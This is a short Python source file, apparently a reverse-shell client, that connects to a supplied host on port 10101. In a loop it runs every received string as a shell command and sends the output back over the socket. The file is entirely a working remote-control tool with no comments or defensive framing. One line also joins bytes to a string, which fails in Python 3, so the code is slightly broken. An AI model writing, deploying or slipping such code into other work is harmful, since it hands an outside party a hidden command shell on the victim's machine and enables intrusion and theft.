import os
import socket
import subprocess


class Client(object):
    host = ""
    sckt = None

    def __init__(self, host):
        self.host = host
        self.sckt = socket.socket()
        self.sckt.connect((self.host, 10101))

    def receive_commands(self):
        while True:
            data = self.sckt.recv(1024)
            if len(data) > 0:
                command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = str(command.stdout.read() + command.stderr.read())
                self.sckt.send(str.encode(output) + " ")
        self.sckt.close()
